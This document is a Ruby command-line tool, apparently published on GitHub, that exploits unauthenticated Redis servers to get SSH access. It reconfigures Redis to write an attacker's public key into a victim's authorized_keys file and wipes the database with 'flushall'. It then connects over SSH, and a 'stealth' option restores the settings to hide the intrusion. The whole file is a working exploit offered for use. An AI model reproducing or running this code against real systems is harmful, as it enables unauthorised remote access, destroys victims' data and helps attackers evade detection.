#! /usr/bin/ruby

require 'optparse'
require 'fileutils'

#Write banner
puts <<-'EOF'
 _____          _ _        _____ _____ _    _ 
|  __ \        | (_)      / ____/ ____| |  | |
| |__) |___  __| |_ ___  | (___| (___ | |__| |
|  _  // _ \/ _  | / __|  \___ \\___ \|  __  |
| | \ \  __/ (_| | \__ \  ____) |___) | |  | |
|_|  \_\___|\__,_|_|___/ |_____/_____/|_|  |_|

By Levitating
https://github.com/LevitatingBusinessMan/redis-ssh

Version 1.0.1

EOF

#Reference: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

@opts = {port: "6379", timeout: "1", sshport: "22"}
OptionParser.new do |parser|
	parser.banner = "Usage: ./redis_ssh.rb [options]"

	parser.on("-h", "--host HOST", "Victim (required)") do |h|
		@opts[:host] = h
	end
	parser.on("-p", "--port PORT", /\d*/, "Port (default: 6379)") do |p|
		@opts[:port] = p
	end
	parser.on("-v", "--[no-]verbose", "Run verbosely") do |v|
		@opts[:verbose] = v
	end
	parser.on("-t", "--timeout TIME", "Time to wait for packets (default: 1)") do |t|
		@opts[:timeout] = t
	end
	parser.on("-u", "--user USER", "Force specific user") do |u|
		@opts[:user] = u
	end
	parser.on("-d", "--dir DIR", "Force specific .ssh directory") do |d|
		@opts[:dir] = d
	end
	parser.on("-s", "--sshport PORT", "Port to ssh to (default: 22)") do |s|
		@opts[:sshport] = s
	end
	parser.on("-c", "--check", "Run a vulnerability check") do |s|
		@opts[:check] = s
	end
	parser.on("-i", "--info", "Print info about a redis server") do |i|
		@opts[:info] = i
	end
	parser.on("-e", "--stealth", "Restore configuration to stay hidden") do |e|
		@opts[:stealth] = e
	end
	parser.on(nil, "--help", "Print this help") do
        puts parser
        exit
    end
end.parse!

if !@opts[:host]
	puts "Missing host!"
	return
end

#For exit and log oneliners
@changedConfigDir = @changedConfigFile = false
def error
	yield
	if @changedConfigDir or @changedConfigFile
		Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
	end
	exit 1
end

class Log

	def self.info msg
		print "\e[34m[info]\e[0m "
		p msg
	end

	def self.succ msg
		print "\e[32m[succ]\e[0m "
		p msg
	end

	def self.warn msg
		print "\e[93m[warn]\e[0m "
		p msg
	end

	def self.err msg
		print "\e[31m[err]\e[0m "
		p msg
	end

	def self.req msg
		print "\e[31m[>>]\e[0m "
		p msg
	end
	
	def self.res msg
		print "\e[32m[<<]\e[0m "
		p msg
	end

end

def send msg
	Log.req msg if @opts[:verbose]
	
	out = `exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]} && printf '#{msg}\n' >&5 && timeout #{@opts[:timeout]} cat <&5`
	Log.warn "Received empty response, increasing the timeout may help" if out.empty?
	return out

	#`echo "#{msg}" | timeout --preserve-status 1 nc #{@opts[:host]} #{@opts[:port]}`
end

# Check if netcat is present
#return puts("NetCat is not installed") if !system("which nc > /dev/null 2>&1")

host_dir = File.expand_path "~/.local/share/redis_ssh/#{@opts[:host]}"
if File.file? "#{host_dir}/id_rsa" and File.file? "#{host_dir}/user"
	user = File.read "#{host_dir}/user"
	Log.succ "Discovered existing private key for this host"
	print "Do you want to ssh immeditaly as #{user}? (y/n) "
	answer = gets.chomp
	exec "ssh -i #{host_dir}/id_rsa #{user}@#{@opts[:host]} -p #{@opts[:sshport]}" if answer == "y" or answer == "yes"
end

#Check if up
Log.info "Check if port #{@opts[:port]} is open"
# Because the status code isn't 0 when the host doesnt not respond with anything we allow all non 1 exit codes
error {Log.err "#{@opts[:host]}:#{@opts[:port]} not responding"} if
`timeout --preserve-status #{@opts[:timeout]} sh -c 'cat < /dev/tcp/#{@opts[:host]}/#{@opts[:port]}' > /dev/null 2>&1; echo $?` == "1\n"

Log.info "Gathering information about the victim (use -i to see output)"
def infogather
	out = send "info"
	if !out.include? "# Server"
		Log.res @info if @opts[:verbose]
		Log.err "Failed to gather information from the server"
		exit 1
	end
	puts out if @opts[:info]
	@info = {}
	out.split().each do |option|
		if !option.start_with? "#" and option.include? ":"
			@info[option.split(":")[0]] = option.split(":")[1]
		end
	end
end

infogather

if @info["slave_read_only"] == "1"
	error {Log.err "This is a readonly slave and master server is down!"} if @info["master_link_status"] == "down"
	Log.warn "This is a readonly slave! Attempting to switch to master instead!"
	@opts[:host] = @info["master_host"]
	@opts[:port] = @info["master_port"]
	Log.warn "Future packets will be send to #{@opts[:host]}:#{@opts[:port]}"
	Log.warn "Gathering new info"
	infogather
end

if @info["role"] == "slave"
	Log.warn "This server is a slave of #{@info["master_host"]}:#{@info["master_port"]}, it might be better to attack that server instead."
end

@vuln = false
@revealed_users = []
def sdir dir
	return if !dir
	dirarr = dir.split("/").reject{|x|x.empty?}
	if dirarr[0] == "home" or dirarr[0] == "root"
		user = dirarr[1] if dirarr[0] == "home"
		user = "root" if dirarr[0] == "root"

		# This array makes sure we only prompt for a user once
		if !@revealed_users.include? user
			Log.succ "Directory reveals user #{user}"
			@revealed_users.push(user)

			# No need to ask for input in check mode
			if @opts[:check]
				@vuln = true
				return
			end

			# If this user isnt set prompt to set it
			if @opts[:user] != user
				print "Do you want to attack user #{user}? (y/n) "
				answer = gets.chomp
				if answer == "y" or answer == "yes"
					@opts[:user] = user
					
					if !@opts[:dir]
						if user == "root"
							@opts[:dir] = "/root/.ssh"
						else
							@opts[:dir] = "/home/#{user}/.ssh" 
						end
					end

				end
			end
		end
	end
end

if @info["executable"]
	Log.info "Executable: #{@info["executable"]}"
	sdir @info["executable"]
end

if @info["config_file"]
	Log.info "Config_file: #{@info["config_file"]}"
	sdir @info["config_file"]
end

# Config directory retrieval
out = send "config get dir"
Log.res out if @opts[:verbose]
Log.warn "Unable to read config dir" if !out.start_with?("*2\r\n$3\r\ndir\r\n")

@conf_dir = out.split("\r\n")[4]
Log.info "Config directory: #{@conf_dir}"
sdir @conf_dir

if @opts[:check]
	if @vuln
		Log.succ "Configurations reveal home directorie(s), this host is might be vulnerable"
	else
		Log.warn "No user found. This host is probably not vulnerable"
	end
end

# When doing a vuln check dont go further
exit 0 if @opts[:check]

# Making sure a user and directory are set
if !@opts[:user]
	Log.warn "No user found. defaulting to user 'redis' with home '/var/lib/redis/.ssh', this host is probably not vulnerable"
	@opts[:user] = "redis"
	@opts[:dir] = "/var/lib/redis/.ssh"
elsif !@opts[:dir]
	Log.warn "Using directory '/home/#{user}/.ssh'"
	@opts[:dir] = "/home/#{user}/.ssh"
end

Log.info "Setting configuration directory"
out = send "config set dir #{@opts[:dir]}"
Log.res out if @opts[:verbose]
error {Log.err "Failed to change config directory to .ssh (might not exist)"} if out != "+OK\r\n"
@changedConfigDir = true

if @opts[:stealth]
	# Config directory retrieval
	Log.info "Getting original database filename"
	out = send "config get dbfilename"
	Log.res out if @opts[:verbose]
	Log.warn "Unable to read database filename" if !out.start_with?("*2\r\n$10\r\ndbfilename\r\n")

	@conf_dbfilename = out.split("\r\n")[4]
end

Log.info "Change database file to authorized_keys"
out = send "config set dbfilename authorized_keys"
Log.res out if @opts[:verbose]
error {Log.err "Failed to change config database filename"} if out != "+OK\r\n"
@changedConfigFile = true

=begin # Checking if we can set a key
Log.info "Checking if we can set a key"
out = send "set foo bar"
Log.res out if @opts[:verbose]
return Log.err "Failed to save value on the server" if out != "+OK\r\n"
=end

#Create dir to save key
FileUtils.mkdir_p host_dir

# Generate ssh keypair
Log.info "Generating new ssh keypair"
error {Log.err "Error generating keypair"} if `ssh-keygen -t rsa -N "" -q -f #{host_dir}/id_rsa -C #{@opts[:user]}@#{@opts[:host]} <<< y; echo $?`[-2] == "1"
pubkey = File.read "#{host_dir}/id_rsa.pub"
error {Log.err "Error generating keypair: " + pubkey} if !pubkey.start_with? "ssh-rsa"

# Checking if we can set a key
Log.info "Attempt to flush database"
out = send "flushall"
Log.res out if @opts[:verbose]
Log.warn "Failed to flush the database" if out != "+OK\r\n"

# Saving pkey value
Log.info "Saving public key as value"
# After struggling for like an hour on this I found the only way to send a multiline is by like this (following protocl strictly)
opendesc = "exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]}"
escaped_string = "*3\r\n\$3\r\nset\r\n\$4\r\npkey\r\n\$#{pubkey.length + 4}\r\n#{"\n\n" + pubkey + "\n\n"}\r\n"
out = send escaped_string
Log.res out if @opts[:verbose]
error {Log.err "Failed to save key on the server"} if out != "+OK\r\n"

Log.info "Saving database"
out = send "save"
Log.res out if @opts[:verbose]
error {Log.err "Failed to save database"} if out != "+OK\r\n"

# Save user for later runs
File.write "#{host_dir}/user", @opts[:user]

if !@opts[:stealth]
	Log.warn "Not using -e flag, so not cleaning up"
else
	if @conf_dir
		Log.info "Restoring configuration directory"
		out = send "config set dir #{@conf_dir}"
		Log.res out if @opts[:verbose]
		Log.warn "Failed to change config directory back" if out != "+OK\r\n"
	end

	if @conf_dbfilename
		Log.info "Restoring databasefile"
		out = send "config set dbfilename #{@conf_dbfilename}"
		Log.res out if @opts[:verbose]
		Log.warn "Failed to restore config database filename" if out != "+OK\r\n"
	end
end

Log.info "Running ssh"
exec "ssh -i #{host_dir}/id_rsa #{@opts[:user]}@#{@opts[:host]} -p #{@opts[:sshport]}"
